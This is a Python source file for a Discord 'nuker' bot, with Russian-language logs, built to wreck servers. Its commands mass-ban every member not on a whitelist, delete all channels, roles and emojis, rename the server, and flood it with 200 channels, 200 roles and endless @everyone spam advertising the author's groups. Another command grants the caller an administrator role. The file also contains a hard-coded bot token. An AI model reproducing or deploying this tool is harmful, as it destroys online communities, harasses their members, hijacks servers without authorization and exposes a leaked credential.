import discord, os, sys, random, string, requests
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name
init()

whit = [610453921726595082]

if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='t!', intents=intents )


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('genshin impact'))
    print(f"""{Fore.RED}

  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|

{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")

@client.command()
async def ac(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue
            
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1

    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
    await ctx.send("huh")
    await ctx.guild.edit(name="crash9d!")
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
    
    
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        else:
            break
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
    
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        await ctx.guild.create_text_channel("CRASH9D")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам ролями")
    for a in range(200):
        await ctx.guild.create_role(name="BABABOOEY")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
    
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
   
@client.command()
async def selfadm(ctx, pos: int):
    try:
        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
        await role.edit(position=pos, reason="Админ идиот")
        await ctx.message.author.add_roles(role)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")

@client.command()
async def delrole(ctx):
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
      if ctx.guild.me.roles[-1] > role:
          await role.delete()
          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
      else:
          break
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")

@client.command()
async def spam(ctx):
    while True:
        await ctx.send("server crash9d! vk: https://shrk.tk/chaosVK     server: https://shrk.tk/chaosdis @everyone")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")

@client.command()
async def roles(ctx):
    for role in ctx.guild.roles:
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Все роли найдены")

    


try:
    client.run('ODMzOTcxMTMxNTI5ODIyMjI5.YH6GJA.urvJPpm8F0mcKu57Uk42F8EPiyc')
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
